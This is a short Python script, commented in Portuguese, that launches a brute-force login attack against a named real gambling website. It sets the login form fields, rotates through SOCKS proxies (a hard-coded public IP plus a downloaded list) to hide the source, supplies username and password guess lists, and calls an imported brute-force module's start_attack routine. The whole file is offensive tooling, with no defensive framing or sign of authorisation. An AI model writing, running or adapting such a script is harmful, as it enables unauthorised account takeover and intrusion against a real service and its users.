#!/usr/bin/env python3
import asyncio
from real_bruteforce_module import RealBruteForceModule

# Endpoint de login inferido
TARGET_URL = "https://99jogo66.com/?id=211995351"

# Campos de login (inferidos do formulário)
USERNAME_FIELD = "account"
PASSWORD_FIELD = "password"

# Lista de proxies (o primeiro é o que funcionou para acesso)
PROXIES = [
    "socks4://177.126.89.63:4145", # Proxy brasileiro funcional
    # Adicionar proxies da lista baixada (se houver)
]

# Wordlists de teste
TEST_USERNAMES = ["test_user", "admin", "user", "99jogo_user"]
TEST_PASSWORDS = ["123456", "password", "admin123", "qwert123"]

def main():
    print("[*] Iniciando teste do Módulo de Força Bruta...")
    
    # Adicionar proxies da lista baixada
    try:
        with open("socks_proxies.txt", "r") as f:
            for line in f:
                ip_port = line.strip()
                if ip_port:
                    PROXIES.append(f"socks5://{ip_port}") # Assumindo SOCKS5 para a lista
    except FileNotFoundError:
        print("[-] Arquivo socks_proxies.txt não encontrado. Usando apenas o proxy inicial.")

    # Inicializar o módulo
    module = RealBruteForceModule(
        proxies=PROXIES,
        target_url=TARGET_URL,
        username_field=USERNAME_FIELD,
        password_field=PASSWORD_FIELD,
        success_text="Login bem-sucedido" # Texto de sucesso a ser ajustado
    )
    
    # Executar o ataque
    asyncio.run(module.start_attack(TEST_USERNAMES, TEST_PASSWORDS))

if __name__ == "__main__":
    main()
